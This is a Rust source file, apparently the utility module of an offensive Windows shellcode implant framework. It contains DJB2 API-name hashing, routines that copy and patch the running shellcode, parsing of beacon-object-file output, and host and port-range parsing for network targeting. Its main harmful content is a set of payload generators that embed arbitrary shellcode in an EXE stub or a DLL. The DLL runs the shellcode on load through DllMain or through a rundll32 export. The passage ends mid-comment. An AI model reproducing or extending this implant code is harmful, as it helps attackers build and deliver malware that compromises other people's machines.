use crate::{_start, get_instance, shellcode_end, MAGIC, TASK};
use alloc::collections::btree_map::BTreeMap;
use alloc::string::ToString;
use alloc::{slice, string::String, vec::Vec};
use core::ffi::c_char;
use core::ffi::c_void;
use core::ffi::CStr;
use core::ffi::VaList;
use core::mem::size_of;
use core::ptr::null_mut;

/// Computes the DJB2 hash for the given buffer
pub fn dbj2_hash(buffer: &[u8]) -> u32 {
    let mut hsh: u32 = 5381;
    let mut iter: usize = 0;
    let mut cur: u8;

    while iter < buffer.len() {
        cur = buffer[iter];

        if cur == 0 {
            iter += 1;
            continue;
        }

        if cur >= ('a' as u8) {
            cur -= 0x20;
        }

        hsh = ((hsh << 5).wrapping_add(hsh)) + cur as u32;
        iter += 1;
    }
    hsh
}

/// Calculates the length of a C-style null-terminated string.
pub fn get_cstr_len(pointer: *const char) -> usize {
    let mut tmp: u64 = pointer as u64;

    unsafe {
        while *(tmp as *const u8) != 0 {
            tmp += 1;
        }
    }

    (tmp - pointer as u64) as _
}

pub fn string_length_w(string: *const u16) -> usize {
    unsafe {
        let mut string2 = string;
        while !(*string2).is_null() {
            string2 = string2.add(1);
        }
        string2.offset_from(string) as usize
    }
}

// Utility function for checking null terminator for u8 and u16
trait IsNull {
    fn is_null(&self) -> bool;
}

impl IsNull for u16 {
    fn is_null(&self) -> bool {
        *self == 0
    }
}

/// Formats a named pipe string and stores it in a `Vec<u16>`
///
/// This function generates a named pipe path in the format:
/// `\\Device\\NamedPipe\\Win32Pipes.<process_id>.<pipe_id>`
/// and stores the UTF-16 encoded string in a `Vec<u16>`.
///
/// # Parameters
/// - `process_id`: The process ID to be included in the pipe name.
/// - `pipe_id`: The pipe ID to be included in the pipe name.
///
/// # Returns
/// A `Vec<u16>` containing the UTF-16 encoded string, null-terminated.
pub fn format_named_pipe_string(process_id: usize, pipe_id: u32) -> Vec<u16> {
    let mut pipe_name_utf16 = Vec::with_capacity(50); // Pre-allocate space

    // Static part of the pipe name
    let device_part = "\\Device\\NamedPipe\\Win32Pipes.";
    pipe_name_utf16.extend(device_part.encode_utf16());

    // Append process_id as a 16-character hex string
    for i in (0..16).rev() {
        let shift = i * 4;
        let hex_digit = ((process_id >> shift) & 0xF) as u16;
        pipe_name_utf16.push(to_hex_char(hex_digit));
    }

    // Append dot separator
    pipe_name_utf16.push('.' as u16);

    // Append pipe_id as an 8-character hex string
    for i in (0..8).rev() {
        let shift = i * 4;
        let hex_digit = ((pipe_id >> shift) & 0xF) as u16;
        pipe_name_utf16.push(to_hex_char(hex_digit));
    }

    // Null-terminate the buffer
    pipe_name_utf16.push(0);

    // Return the UTF-16 encoded vector
    pipe_name_utf16
}

/// Helper function to convert a hex digit (0-15) into its corresponding ASCII character.
///
/// # Returns
/// The corresponding ASCII character as a `u16`.
fn to_hex_char(digit: u16) -> u16 {
    match digit {
        0..=9 => '0' as u16 + digit,
        10..=15 => 'a' as u16 + (digit - 10),
        _ => 0,
    }
}

// turn a Vec<u8> of bytes into a Vec<u8> of hex &[0xde,0xad,0xbe,0xef] -> ['d','e','a','d','b','e','e','f']

pub fn get_bytes_from_hex(hex: &str) -> Vec<u8> {
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).unwrap())
        .collect()
}

pub fn get_hex_from_bytes(buf: &[u8]) -> Vec<u8> {
    let mut hex = Vec::with_capacity(buf.len() * 2);
    let hex_chars = b"0123456789abcdef";

    for &byte in buf.iter() {
        //get upper nibble char
        hex.push(hex_chars[(byte >> 4) as usize]);
        //get lower nibble char
        hex.push(hex_chars[(byte & 0xf) as usize]);
    }
    hex
}

pub fn as_u8_slice(data: &Vec<u16>) -> &[u8] {
    unsafe { slice::from_raw_parts(data.as_ptr() as *const u8, data.len() * size_of::<u16>()) }
}

// Returns a string of hex for an address
pub fn get_addr_hex(ptr: usize) -> [u8; 16] {
    let mut buf = [0u8; 16]; // for 64-bit address
    let hex_chars = b"0123456789abcdef";

    for i in 0..16 {
        let nibble = (ptr >> ((15 - i) * 4)) & 0xf;
        buf[i] = hex_chars[nibble as usize];
    }
    buf
}

// Write to stdout
pub fn write_output(buf: &[u8]) {
    let mut bytes_written = 0;

    let mut out = Vec::with_capacity(buf.len() + 1);
    out.extend_from_slice(buf);
    out.push(b'\n');
    unsafe {
        (get_instance().unwrap().k32.write_file)(
            -11i32 as u32 as *mut c_void,
            out.as_ptr() as *const c_void,
            out.len() as u32,
            &mut bytes_written,
            null_mut(),
        )
    };
}

// get the size of the current shellcode
pub fn get_shellcode_size() -> usize {
    unsafe {
        //let end_addr = &shellcode_end as *const u8 as usize;
        //write_output(&get_addr_hex(end_addr));
        //let start_addr = _start as *const () as usize;
        //end_addr - start_addr

        &shellcode_end as *const u8 as usize
    }
}

pub fn get_shellcode(task: Option<u8>, magic: Option<u32>) -> Vec<u8> {
    let shellcode_size = get_shellcode_size();
    let bytecode_size = crate::libs::utils::get_bytecode_size();
    let total_size = shellcode_size + bytecode_size;

    // Copy shellcode + appended bytecode data
    let shellcode = unsafe { core::slice::from_raw_parts(_start as *mut u8, total_size) };
    let mut mshellcode = Vec::from(shellcode);

    if let Some(t) = task {
        mshellcode[get_task_offset()] = t;
    }

    if let Some(m) = magic {
        let offset = get_magic_offset();
        let bytes = m.to_le_bytes();
        mshellcode[offset..offset + 4].copy_from_slice(&bytes);
    }

    mshellcode
}

pub fn get_task_offset() -> usize {
    unsafe {
        let task_addr = &TASK as *const _ as usize;
        let start_addr = _start as *const () as usize;
        task_addr - start_addr
    }
}

pub fn get_magic_offset() -> usize {
    unsafe {
        let magic_addr = &MAGIC as *const _ as usize;
        let start_addr = _start as *const () as usize;
        magic_addr - start_addr
    }
}

pub fn get_task() -> u8 {
    unsafe {
        let s = _start as *const () as *const u8;
        let t = s.add(get_task_offset());
        *t
    }
}

pub fn get_magic() -> u32 {
    unsafe {
        core::ptr::read_volatile(&MAGIC)
    }
}

pub fn get_shellcode_data_ptr() -> *const c_void {
    unsafe {
        let start_addr = _start as *const () as usize;
        (start_addr + get_shellcode_size()) as *const c_void
    }
}

/// Get the size of the appended bytecode data.
/// Bytecode format: [version: u8][total_len: u32 LE][data...]
pub fn get_bytecode_size() -> usize {
    unsafe {
        let data_ptr = get_shellcode_data_ptr() as *const u8;
        // Read u32 LE from bytes 1-4 (after version byte)
        let b0 = *data_ptr.add(1) as u32;
        let b1 = *data_ptr.add(2) as u32;
        let b2 = *data_ptr.add(3) as u32;
        let b3 = *data_ptr.add(4) as u32;
        (b0 | (b1 << 8) | (b2 << 16) | (b3 << 24)) as usize
    }
}
pub fn get_raw_str(data_pointer: *const c_void) -> String {
    unsafe {
        CStr::from_ptr(data_pointer as *const c_char)
            .to_string_lossy()
            .into_owned()
    }
}

pub unsafe fn printf(format: &str, mut args: VaList) -> String {
    let mut out = String::new();

    let mut chars = format.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '%' {
            let mut zero_pad = 0;
            if let Some(&next) = chars.peek() {
                if next == '0' {
                    chars.next(); //consume 0
                    let mut temp_iter = chars.clone();
                    while let Some(digit) = temp_iter.next() {
                        if let Some(d) = digit.to_digit(10) {
                            zero_pad = zero_pad * 10 + d as usize;
                            chars.next(); // Consume the digit
                        } else {
                            break;
                        }
                    }
                }
            }
            match chars.next() {
                Some('d') => {
                    let mut value: i32 = args.arg();
                    //neg
                    if value < 0 {
                        out.push('-');
                        value = -value;
                    }
                    let mut digits = [0; 10];
                    let mut i = 0;

                    loop {
                        digits[i] = (value % 10) as u8 + b'0';
                        value /= 10;
                        i += 1;

                        if value == 0 {
                            break;
                        }
                    }

                    while i > 0 {
                        i -= 1;
                        out.push(digits[i] as char);
                    }
                }
                Some('s') => {
                    // Read a string
                    let value: *const u8 = args.arg();
                    if !value.is_null() {
                        let c_str = unsafe { core::ffi::CStr::from_ptr(value as *const i8) };
                        out.push_str(c_str.to_str().unwrap_or("<invalid>"));
                    }
                }
                Some('l') => match chars.next() {
                    Some('s') => {
                        let value: *const u16 = args.arg();
                        let mut wide_str = Vec::new();
                        let mut ptr = value as *const u16;

                        // Traverse the UTF-16 string and collect u16 values
                        while unsafe { *ptr != 0 } {
                            // Null-terminated string
                            wide_str.push(unsafe { *ptr });
                            ptr = unsafe { ptr.add(1) }; // Move to the next u16
                        }

                        // Convert the wide string to a regular Rust String
                        let decoded_str = String::from_utf16_lossy(&wide_str);
                        out.push_str(&decoded_str);
                    }
                    Some('x') => {
                        let mut value: u64 = args.arg();
                        convert_to_hex(value, &mut out, zero_pad);
                    }
                    _ => {
                        let _ = out.push_str("<invalid>");
                    }
                },
                Some('x') => {
                    let mut value: u64 = args.arg();
                    convert_to_hex(value, &mut out, zero_pad);
                }
                Some('%') => {
                    let _ = out.push('%');
                }
                _ => {
                    let _ = out.push_str("<invalid>");
                }
            }
        } else {
            let _ = out.push(c);
        }
    }
    out
}

fn convert_to_hex(value: u64, out: &mut String, zero_pad: usize) {
    let mut hex_digits = [0; 16];
    let mut i = 0;

    let mut val = value.clone();
    loop {
        let digit = (val & 0xF) as u8;
        hex_digits[i] = if digit < 10 {
            b'0' + digit
        } else {
            b'a' + (digit - 10)
        };
        val >>= 4;
        i += 1;

        if val == 0 {
            break;
        }
    }

    // Apply zero-padding and width
    while i < zero_pad {
        out.push('0');
        i += 1;
    }

    while i > 0 {
        i -= 1;
        out.push(hex_digits[i] as char);
    }
}

/// Redirects stdout to a file or named pipe.
///
/// Auto-detects based on path:
/// - Paths starting with `\\.\pipe\` are treated as named pipes (OPEN_EXISTING)
/// - All other paths are treated as files (CREATE_ALWAYS)
pub fn redirect_stdout(path: &str) -> *mut c_void {
    let mut path_w: Vec<u16> = path.encode_utf16().chain(Some(0)).collect();

    // Detect if this is a pipe or a file
    let is_pipe = path.starts_with("\\\\.\\pipe\\") || path.starts_with("\\\\?\\pipe\\");
    let disposition = if is_pipe { 3 } else { 2 }; // OPEN_EXISTING (3) for pipes, CREATE_ALWAYS (2) for files

    unsafe {
        let handle = (get_instance().unwrap().k32.create_file_w)(
            path_w.as_mut_ptr(),
            0x40000000,  // GENERIC_WRITE
            0,           // no sharing
            null_mut(),
            disposition,
            0x80,        // FILE_ATTRIBUTE_NORMAL
            null_mut(),
        );

        (get_instance().unwrap().k32.set_std_handle)(-11i32 as u32, handle);
        handle
    }
}

// converts GetLastError into a variable number of bytes for output
pub fn last_error_to_bytes() -> Vec<u8> {
    unsafe {
        let error = (get_instance().unwrap().k32.get_last_error)();
        let bytes = error.to_be_bytes();
        let non_zero = bytes.iter().position(|&x| x > 0).unwrap_or(bytes.len());
        Vec::from(&bytes[non_zero..])
    }
}

pub fn get_last_error_hex() -> Vec<u8> {
    unsafe {
        let le = last_error_to_bytes();
        get_hex_from_bytes(&le)
    }
}

/// Use FormatMessageW to get the Windows error string for a given error code.
/// Returns UTF-8 bytes. Works for Win32 error codes and HRESULTs.
pub fn format_error(code: u32) -> Vec<u8> {
    unsafe {
        let inst = match get_instance() {
            Some(i) => i,
            None => return Vec::new(),
        };
        // FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS
        let flags: u32 = 0x1300;
        let mut buf: *mut u16 = core::ptr::null_mut();
        let len = (inst.k32.format_message_w)(
            flags,
            core::ptr::null(),
            code,
            0, // default language
            &mut buf as *mut *mut u16 as *mut u16,
            0,
            core::ptr::null(),
        );
        if len == 0 || buf.is_null() {
            return Vec::new();
        }
        // Convert UTF-16 to UTF-8
        let mut result = Vec::new();
        let mut i = 0usize;
        while i < len as usize {
            let c = *buf.add(i);
            if c == 0 { break; }
            // Skip trailing \r\n
            if c == 0x0D || c == 0x0A {
                i += 1;
                continue;
            }
            if c < 0x80 {
                result.push(c as u8);
            } else if c < 0x800 {
                result.push((0xC0 | (c >> 6)) as u8);
                result.push((0x80 | (c & 0x3F)) as u8);
            } else {
                result.push((0xE0 | (c >> 12)) as u8);
                result.push((0x80 | ((c >> 6) & 0x3F)) as u8);
                result.push((0x80 | (c & 0x3F)) as u8);
            }
            i += 1;
        }
        (inst.k32.local_free)(buf as *mut c_void);
        result
    }
}

pub fn decode_base64(input: &str) -> Result<Vec<u8>, &'static str> {
    const BASE64_TABLE: &[u8; 64] =
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut output = Vec::new();
    let mut buffer = 0u32;
    let mut bits = 0;

    for &byte in input.as_bytes() {
        let value = match byte {
            b'A'..=b'Z' => byte - b'A',
            b'a'..=b'z' => byte - b'a' + 26,
            b'0'..=b'9' => byte - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            b'=' => {
                bits += 2; // Padding characters affect the bit alignment.
                continue;
            }
            _ => return Err("Invalid Base64 character"),
        };

        buffer = (buffer << 6) | value as u32;
        bits += 6;

        if bits >= 8 {
            bits -= 8;
            output.push(((buffer >> bits) & 0xFF) as u8);
        }
    }

    if bits > 0 && (buffer << (8 - bits)) & 0xFF != 0 {
        return Err("Invalid Base64 padding");
    }

    Ok(output)
}

pub fn encode_base64(input: &[u8]) -> String {
    const BASE64_TABLE: &[u8; 64] =
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let mut output = String::new();
    let mut i = 0;

    while i < input.len() {
        let b0 = input[i] as u32;
        let b1 = if i + 1 < input.len() { input[i + 1] as u32 } else { 0 };
        let b2 = if i + 2 < input.len() { input[i + 2] as u32 } else { 0 };

        let triple = (b0 << 16) | (b1 << 8) | b2;

        output.push(BASE64_TABLE[((triple >> 18) & 0x3F) as usize] as char);
        output.push(BASE64_TABLE[((triple >> 12) & 0x3F) as usize] as char);

        if i + 1 < input.len() {
            output.push(BASE64_TABLE[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            output.push('=');
        }

        if i + 2 < input.len() {
            output.push(BASE64_TABLE[(triple & 0x3F) as usize] as char);
        } else {
            output.push('=');
        }

        i += 3;
    }

    output
}

pub fn int_to_str(num: u32) -> String {
    match num {
        0 => "0".to_string(),
        _ => {
            let mut buf = [0u8; 10];
            let mut temp = num;
            let mut i = 9;

            while temp > 0 {
                buf[i] = (temp % 10) as u8 + b'0';
                temp /= 10;
                if i > 0 {
                    i -= 1;
                }
            }

            // Get the slice starting from the first valid byte (ignoring leading zeros)
            core::str::from_utf8(&buf[(i + 1)..])
                .unwrap_or_default()
                .to_string()
        }
    }
}

pub fn split_bof_output(out: String) -> BTreeMap<String, String> {
    let mut results: BTreeMap<String, String> = BTreeMap::new();

    for line in out.lines() {
        if let Some((key, value)) = line.split_once(':') {
            let key = key.trim_start_matches("[*]").trim();
            let value = value.trim();
            results.insert(key.to_string(), value.to_string());
        }
    }

    results
}

pub fn caesar_cipher(text: &str, shift: i8) -> String {
    let mut result = String::new();

    let shift = ((shift % 26) + 26) % 26;

    for c in text.chars() {
        if c.is_ascii_uppercase() {
            let new_char = (((c as u8 - b'A' + shift as u8) % 26) + b'A') as char;
            result.push(new_char);
        }
        else if c.is_ascii_lowercase() {
            let new_char = (((c as u8 - b'a' + shift as u8) % 26) + b'a') as char;
            result.push(new_char);
        }
        else {
            result.push(c);
        }
    }
    result
}

// PE header offsets (for PE32+ / x64)
const OFF_SIZE_OF_CODE: usize = 156;         // Optional header + 4
const OFF_SIZE_OF_IMAGE: usize = 208;        // Optional header + 56
const OFF_SECTION_VIRTUAL_SIZE: usize = 400; // .text section VirtualSize (section header at 392 + 8)
const OFF_SECTION_RAW_SIZE: usize = 408;     // .text section SizeOfRawData (section header at 392 + 16)
const FILE_ALIGNMENT: usize = 0x200;         // 512 bytes
const SECTION_ALIGNMENT: usize = 0x1000;     // 4096 bytes

/// Align value up to alignment boundary
fn align_up(value: usize, alignment: usize) -> usize {
    (value + alignment - 1) & !(alignment - 1)
}

/// Generate an EXE with shellcode embedded in .text section
/// Takes shellcode bytes and returns complete PE executable
#[cfg(feature = "payload_gen")]
pub fn generate_exe(shellcode: &[u8]) -> Vec<u8> {
    use crate::blobs::EXE_STUB;

    let mut exe = Vec::from(EXE_STUB.as_slice());

    let sc_size = shellcode.len();
    let raw_size = align_up(sc_size, FILE_ALIGNMENT);
    let virtual_size = align_up(sc_size, SECTION_ALIGNMENT);

    // SizeOfImage = headers (0x1000) + .text virtual size
    let size_of_image = 0x1000 + virtual_size;

    // Update SizeOfCode (u32 LE)
    exe[OFF_SIZE_OF_CODE..OFF_SIZE_OF_CODE + 4]
        .copy_from_slice(&(raw_size as u32).to_le_bytes());

    // Update SizeOfImage (u32 LE)
    exe[OFF_SIZE_OF_IMAGE..OFF_SIZE_OF_IMAGE + 4]
        .copy_from_slice(&(size_of_image as u32).to_le_bytes());

    // Update .text VirtualSize (u32 LE)
    exe[OFF_SECTION_VIRTUAL_SIZE..OFF_SECTION_VIRTUAL_SIZE + 4]
        .copy_from_slice(&(sc_size as u32).to_le_bytes());

    // Update .text SizeOfRawData (u32 LE)
    exe[OFF_SECTION_RAW_SIZE..OFF_SECTION_RAW_SIZE + 4]
        .copy_from_slice(&(raw_size as u32).to_le_bytes());

    // Append shellcode
    exe.extend_from_slice(shellcode);

    // Pad to file alignment
    let padding = raw_size - sc_size;
    exe.resize(exe.len() + padding, 0x00);

    exe
}

/// Generate a DLL with shellcode embedded
///
/// Two modes based on export_name:
/// - Empty string: Shellcode runs directly from DllMain (for LoadLibrary)
/// - Non-empty: DllMain returns TRUE, shellcode runs via exported function (for rundll32)
#[cfg(feature = "payload_gen")]
pub fn generate_dll(shellcode: &[u8], export_name: &str) -> Vec<u8> {
    use crate::blobs::DLL_STUB;

    let mut dll = Vec::from(DLL_STUB.as_slice());
    let rva_base = 0x1000u32;

    let has_export = !export_name.is_empty();

    if has_export {
        // Mode 2: Export function runs shellcode, DllMain just returns TRUE
        // Layout:
        // 0x00: Export Directory (40 bytes)
        // 0x28: Export Address Table (4 bytes)
        // 0x2C: Name Pointer Table (4 bytes)
        // 0x30: Ordinal Table (2 bytes)
        // 0x32: DLL name "x.dll\0" (6 bytes)
        // 0x38: Export function name (variable + null)
        // Align to 16, then:
        // DllMain stub (returns TRUE)
        // Export stub (jumps to shellcode)
        // Shellcode

        let dll_name = b"x.dll\0";
        let export_name_bytes = export_name.as_bytes();

        let off_export_dir = 0x00usize;
        let off_eat = 0x28usize;
        let off_npt = 0x2Cusize;
        let off_ordinals = 0x30usize;
        let off_dll_name = 0x32usize;
        let off_func_name = off_dll_name + dll_name.len();
        let off_after_strings = off_func_name + export_name_bytes.len() + 1;

        let off_dllmain = (off_after_strings + 15) & !15;
        let off_export_func = off_dllmain + 16;
        let off_shellcode = off_export_func + 16;

        let mut text_section = Vec::new();
        text_section.resize(off_shellcode, 0u8);

        // Export Directory
        text_section[off_export_dir + 12..off_export_dir + 16]
            .copy_from_slice(&(rva_base + off_dll_name as u32).to_le_bytes());
        text_section[off_export_dir + 16..off_export_dir + 20]
            .copy_from_slice(&1u32.to_le_bytes()); // Base
        text_section[off_export_dir + 20..off_export_dir + 24]
            .copy_from_slice(&1u32.to_le_bytes()); // NumberOfFunctions
        text_section[off_export_dir + 24..off_export_dir + 28]
            .copy_from_slice(&1u32.to_le_bytes()); // NumberOfNames
        text_section[off_export_dir + 28..off_export_dir + 32]
            .copy_from_slice(&(rva_base + off_eat as u32).to_le_bytes());
        text_section[off_export_dir + 32..off_export_dir + 36]
            .copy_from_slice(&(rva_base + off_npt as u32).to_le_bytes());
        text_section[off_export_dir + 36..off_export_dir + 40]
            .copy_from_slice(&(rva_base + off_ordinals as u32).to_le_bytes());

        // Export Address Table - points to export stub
        text_section[off_eat..off_eat + 4]
            .copy_from_slice(&(rva_base + off_export_func as u32).to_le_bytes());

        // Name Pointer Table
        text_section[off_npt..off_npt + 4]
            .copy_from_slice(&(rva_base + off_func_name as u32).to_le_bytes());

        // Ordinal Table
        text_section[off_ordinals..off_ordinals + 2].copy_from_slice(&0u16.to_le_bytes());

        // Strings
        text_section[off_dll_name..off_dll_name + dll_name.len()].copy_from_slice(dll_name);
        text_section[off_func_name..off_func_name + export_name_bytes.len()]
            .copy_from_slice(export_name_bytes);

        // DllMain - just return TRUE
        let dllmain_code: [u8; 16] = [
            0xB8, 0x01, 0x00, 0x00, 0x00,  // mov eax, 1
            0xC3,                          // ret
            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
        ];
        text_section[off_dllmain..off_dllmain + 16].copy_from_slice(&dllmain_code);

        // Export stub - jump to shellcode
        let sc_rel = (off_shellcode as i32) - (off_export_func as i32 + 5);
        let export_code: [u8; 16] = [
            0xE9,
            (sc_rel & 0xFF) as u8,
            ((sc_rel >> 8) & 0xFF) as u8,
            ((sc_rel >> 16) & 0xFF) as u8,
            ((sc_rel >> 24) & 0xFF) as u8,
            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
        ];
        text_section[off_export_func..off_export_func + 16].copy_from_slice(&export_code);

        // Append shellcode
        text_section.extend_from_slice(shellcode);

        // Update sizes
        let text_size = text_section.len();
        let raw_size = align_up(text_size, FILE_ALIGNMENT);
        let virtual_size = align_up(text_size, SECTION_ALIGNMENT);
        let size_of_image = 0x1000 + virtual_size;

        dll[OFF_SIZE_OF_CODE..OFF_SIZE_OF_CODE + 4]
            .copy_from_slice(&(raw_size as u32).to_le_bytes());
        dll[OFF_SIZE_OF_IMAGE..OFF_SIZE_OF_IMAGE + 4]
            .copy_from_slice(&(size_of_image as u32).to_le_bytes());
        dll[OFF_SECTION_VIRTUAL_SIZE..OFF_SECTION_VIRTUAL_SIZE + 4]
            .copy_from_slice(&(text_size as u32).to_le_bytes());
        dll[OFF_SECTION_RAW_SIZE..OFF_SECTION_RAW_SIZE + 4]
            .copy_from_slice(&(raw_size as u32).to_le_bytes());

        // Update entry point to DllMain
        let entry_rva = rva_base + off_dllmain as u32;
        dll[168..172].copy_from_slice(&entry_rva.to_le_bytes());

        dll.extend_from_slice(&text_section);
        let padding = raw_size - text_size;
        dll.resize(dll.len() + padding, 0x00);
    } else {
        // Mode 1: No export, shellcode runs from DllMain
        // Add stub to check fdwReason == DLL_PROCESS_ATTACH (1)
        // Clear export directory in header
        dll[264..272].copy_from_slice(&[0u8; 8]);

        // Entry point is at our stub (RVA 0x1000)
        dll[168..172].copy_from_slice(&rva_base.to_le_bytes());

        // DllMain stub: only run shellcode on DLL_PROCESS_ATTACH
        // x64 calling convention: RCX=hinstDLL, RDX=fdwReason, R8=lpvReserved
        let dllmain_stub: [u8; 11] = [
            0x83, 0xFA, 0x01,             // cmp edx, 1 (DLL_PROCESS_ATTACH)
            0x74, 0x06,                   // je +6 (jump to shellcode)
            0xB8, 0x01, 0x00, 0x00, 0x00, // mov eax, 1 (return TRUE)
            0xC3,                         // ret
        ];

        // .text section is stub + shellcode
        let text_size = dllmain_stub.len() + shellcode.len();
        let raw_size = align_up(text_size, FILE_ALIGNMENT);
        let virtual_size = align_up(text_size, SECTION_ALIGNMENT);
        let size_of_image = 0x1000 + virtual_size;

        dll[OFF_SIZE_OF_CODE..OFF_SIZE_OF_CODE + 4]
            .copy_from_slice(&(raw_size as u32).to_le_bytes());
        dll[OFF_SIZE_OF_IMAGE..OFF_SIZE_OF_IMAGE + 4]
            .copy_from_slice(&(size_of_image as u32).to_le_bytes());
        dll[OFF_SECTION_VIRTUAL_SIZE..OFF_SECTION_VIRTUAL_SIZE + 4]
            .copy_from_slice(&(text_size as u32).to_le_bytes());
        dll[OFF_SECTION_RAW_SIZE..OFF_SECTION_RAW_SIZE + 4]
            .copy_from_slice(&(raw_size as u32).to_le_bytes());

        dll.extend_from_slice(&dllmain_stub);
        dll.extend_from_slice(shellcode);
        let padding = raw_size - text_size;
        dll.resize(dll.len() + padding, 0x00);
    }

    dll
}

// ============================================================================
// Host and Port Parsing
// ============================================================================

/// IP range with start and end addresses (host byte order)
#[derive(Clone)]
pub struct IpRange {
    pub start: u32,
    pub end: u32,
}

/// Resolved host with IP address
#[derive(Clone)]
pub struct IpHost {
    pub addr: u32,
    pub name: String,
}

/// Host type - either a range or single host
#[derive(Clone)]
pub enum Host {
    Range(IpRange),
    Single(IpHost),
}

/// Port range
#[derive(Clone)]
pub struct PortRange {
    pub start: u16,
    pub end: u16,
}

/// Parse an IPv4 address string to u32 (host byte order)
pub fn parse_ipv4(ip: &str) -> Option<u32> {
    let ip = ip.trim();
    let mut parts = ip.split('.');
    let mut result: u32 = 0;
    let mut count = 0;

    for _ in 0..4 {
        let part = parts.next()?;
        let octet: u8 = part.parse().ok()?;
        result = (result << 8) | (octet as u32);
        count += 1;
    }

    // Ensure exactly 4 parts and no more
    if count != 4 || parts.next().is_some() {
        return None;
    }

    Some(result)
}

/// Convert u32 (host byte order) to IPv4 string
pub fn ipv4_to_string(ip: u32) -> String {
    let mut s = String::new();
    s.push_str(&int_to_str((ip >> 24) & 0xFF));
    s.push('.');
    s.push_str(&int_to_str((ip >> 16) & 0xFF));
    s.push('.');
    s.push_str(&int_to_str((ip >> 8) & 0xFF));
    s.push('.');
    s.push_str(&int_to_str(ip & 0xFF));
    s
}

/// Check if an IP range string is valid (e.g., "192.168.1.1-192.168.1.255")
fn is_iprange_valid(input: &str) -> bool {
    if let Some(dash_pos) = input.find('-') {
        let ip_start = &input[..dash_pos];
        let ip_end = &input[dash_pos + 1..];
        parse_ipv4(ip_start).is_some() && parse_ipv4(ip_end).is_some()
    } else {
        false
    }
}

/// Generate IP range from CIDR notation (e.g., "192.168.1.0/24")
pub fn generate_ips_from_cidr(cidr: &str) -> Result<IpRange, Vec<u8>> {
    let slash_pos = cidr.find('/').ok_or_else(|| b"Invalid CIDR: no slash".to_vec())?;

    let ip = &cidr[..slash_pos];
    let prefix_str = &cidr[slash_pos + 1..];

    let base = parse_ipv4(ip).ok_or_else(|| b"Invalid CIDR base address".to_vec())?;

    let prefix_len: u32 = prefix_str
        .trim()
        .parse()
        .map_err(|_| b"Invalid CIDR prefix".to_vec())?;

    if prefix_len > 32 {
        return Err(b"Invalid CIDR prefix length".to_vec());
    }

    let (mask, range) = if prefix_len == 32 {
        (0xFFFFFFFFu32, 1u32)
    } else if prefix_len == 0 {
        (0u32, 0xFFFFFFFFu32)
    } else {
        let mask = !((1u32 << (32 - prefix_len)) - 1);
        let range = 1u32 << (32 - prefix_len);
        (mask, range)
    };

    let start = base & mask;
    let end = start.wrapping_add(range).wrapping_sub(1);

    Ok(IpRange { start, end })
}

/// Generate IP range from range notation (e.g., "192.168.1.1-192.168.1.255")
pub fn generate_ips_from_range(range: &str) -> Result<IpRange, Vec<u8>> {
    let dash_pos = range.find('-').ok_or_else(|| b"Invalid range: no dash".to_vec())?;

    let start_ip = &range[..dash_pos];
    let end_ip = &range[dash_pos + 1..];

    let start = parse_ipv4(start_ip).ok_or_else(|| b"Invalid range start IP".to_vec())?;
    let end = parse_ipv4(end_ip).ok_or_else(|| b"Invalid range end IP".to_vec())?;

    // Swap if start > end
    if start <= end {
        Ok(IpRange { start, end })
    } else {
        Ok(IpRange { start: end, end: start })
    }
}

/// Generate host from IP or hostname
/// For hostnames, uses winsock getaddrinfo to resolve
#[cfg(feature = "network")]
pub fn generate_ips_from_iphost(input: &str) -> Result<IpHost, Vec<u8>> {
    let input = input.trim();

    // First try parsing as IP
    if let Some(addr) = parse_ipv4(input) {
        return Ok(IpHost {
            addr,
            name: String::from(input),
        });
    }

    // Otherwise resolve hostname using winsock
    use crate::libs::winsock::{init_winsock, AddrInfo, SockAddrIn};
    use alloc::ffi::CString;

    init_winsock();

    let hostname_cstr = CString::new(input).map_err(|_| b"Invalid hostname".to_vec())?;

    unsafe {
        let mut hints: AddrInfo = core::mem::zeroed();
        hints.ai_family = 2; // AF_INET
        hints.ai_socktype = 1; // SOCK_STREAM

        let mut res: *mut AddrInfo = core::ptr::null_mut();

        let status = (get_instance().unwrap().winsock.getaddrinfo)(
            hostname_cstr.as_ptr(),
            core::ptr::null(),
            &hints,
            &mut res,
        );

        if status != 0 || res.is_null() {
            return Err(b"Failed to resolve hostname".to_vec());
        }

        // Get first IPv4 result
        let mut addr_info_ptr = res;
        let mut result_addr: Option<u32> = None;

        while !addr_info_ptr.is_null() {
            let addr_info = &*addr_info_ptr;
            if addr_info.ai_family == 2 {
                // AF_INET
                let sockaddr_in = addr_info.ai_addr as *const SockAddrIn;
                // Convert from network byte order to host byte order
                let addr = u32::from_be((*sockaddr_in).sin_addr.s_addr);
                result_addr = Some(addr);
                break;
            }
            addr_info_ptr = addr_info.ai_next;
        }

        (get_instance().unwrap().winsock.freeaddrinfo)(res);

        match result_addr {
            Some(addr) => Ok(IpHost {
                addr,
                name: String::from(input),
            }),
            None => Err(b"No IPv4 address found".to_vec()),
        }
    }
}

/// Parse comma-separated hosts (ranges, CIDRs, or hostnames)
#[cfg(feature = "network")]
pub fn parse_hosts(input: &str) -> Result<Vec<Host>, Vec<u8>> {
    let mut hosts = Vec::new();

    for token in input.split(',') {
        let token = token.trim();
        if token.is_empty() {
            continue;
        }

        let host = if token.contains('-') && is_iprange_valid(token) {
            // IP range
            Host::Range(generate_ips_from_range(token)?)
        } else if token.contains('/') {
            // CIDR
            Host::Range(generate_ips_from_cidr(token)?)
        } else {
            // IP or hostname
            Host::Single(generate_ips_from_iphost(token)?)
        };

        hosts.push(host);
    }

    if hosts.is_empty() {
        return Err(b"No valid hosts parsed".to_vec());
    }

    Ok(hosts)
}

/// Check if port is valid (1-65535)
fn is_port_valid(port: u32) -> bool {
    port >= 1 && port <= 65535
}

/// Parse comma-separated ports or port ranges (e.g., "80,443,8000-8100")
